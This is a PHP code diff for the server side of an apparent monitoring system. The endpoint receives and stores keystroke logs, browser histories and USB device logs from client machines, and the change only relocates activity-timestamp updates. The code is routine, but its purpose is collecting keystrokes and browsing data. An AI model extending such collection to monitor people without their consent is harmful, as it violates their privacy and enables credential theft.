@@ -59,11 +59,9 @@ $response = ['status' => 'success', 'message' => 'Event processed successfully']
 
 try {
     
-    // Update monitor activity timestamp
-    $dbService->updateMonitorActivity($clientIP, 'monitor');
-    
     switch ($appEvent) {
         case 'Tic':
+            // Tic is just a heartbeat - no activity update needed
             $response['data'] = ['interval' => 30]; // Return interval for next tic
             break;
             
@@ -71,6 +69,7 @@ try {
             $browserHistories = $data['BrowserHistories'] ?? [];
             if (!empty($browserHistories)) {
                 $inserted_count = $dbService->addBrowserHistoryLogs($browserHistories, $clientIP, $macAddress);
+                // Update monitor activity for browser history logging
                 $dbService->updateMonitorActivity($clientIP, 'browser');
                 $response['data'] = [
                     'inserted_count' => $inserted_count,
@@ -83,6 +82,8 @@ try {
             $keyLogs = $data['KeyLogs'] ?? [];
             if (!empty($keyLogs)) {
                 $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
+                // Update monitor activity for key logging
+                $dbService->updateMonitorActivity($clientIP, 'monitor');
                 $response['data'] = [
                     'inserted_count' => $inserted_count,
                     'interval' => 60 // Return interval for next key log sync
@@ -94,6 +95,8 @@ try {
             $usbLogs = $data['USBLogs'] ?? [];
             if (!empty($usbLogs)) {
                 $inserted_count = $dbService->addUSBDeviceLogs($usbLogs, $clientIP, $macAddress);
+                // Update monitor activity for USB logging
+                $dbService->updateMonitorActivity($clientIP, 'monitor');
                 $response['data'] = [
                     'inserted_count' => $inserted_count,
                     'interval' => 30 // Return interval for next USB log sync
